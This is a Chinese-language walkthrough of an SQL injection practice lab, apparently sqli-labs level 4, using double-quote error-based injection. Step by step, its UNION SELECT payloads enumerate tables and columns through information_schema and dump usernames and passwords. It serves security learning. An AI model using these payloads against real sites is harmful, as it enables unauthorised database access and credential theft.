# Less-4 Error based - Double quotes - String

根据题意输入双引号，报错

?id=1"

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1602837942760-5db6e761-7c1f-4ae4-ac0c-1e8639a632d7.png)

根据报错信息，调整语句，正常显示

?id=1") and 1=1 --+

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1602838116511-731a32c5-d200-4d4a-aa3d-3d669368ab9b.png)

利用order by猜测字段数，从1开始，4报错，字段数为3

?id=1") order by 4 --+

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1602838248470-4e583b48-35fd-4a85-a314-fa6eb26067d7.png)

利用union联合查询，查看回显位置，记得前面的id改为一个查询不到的

?id=-1") union select 1,2,3 --+

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1602838336105-18c2c9b8-02bf-4be8-9f26-ced7244df375.png)

查表名

?id=-1") union  select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1602838466081-bacc61f9-9269-45b8-a62b-c8c07ed97544.png)

查字段名

?id=-1") union  select 1,2,group_concat(column_name) from information_schema.columns where table_name='users' and table_schema=database() --+

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1602838529133-86e0d0dd-9a0e-4d13-b25c-60e6f7140abe.png)

根据字段名和表名获取数据

?id=-1") union select 1,2,group_concat(username," ",password) from users --+

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1602838625919-35a774eb-d482-4cd7-9e9b-2c5531c0d85d.png)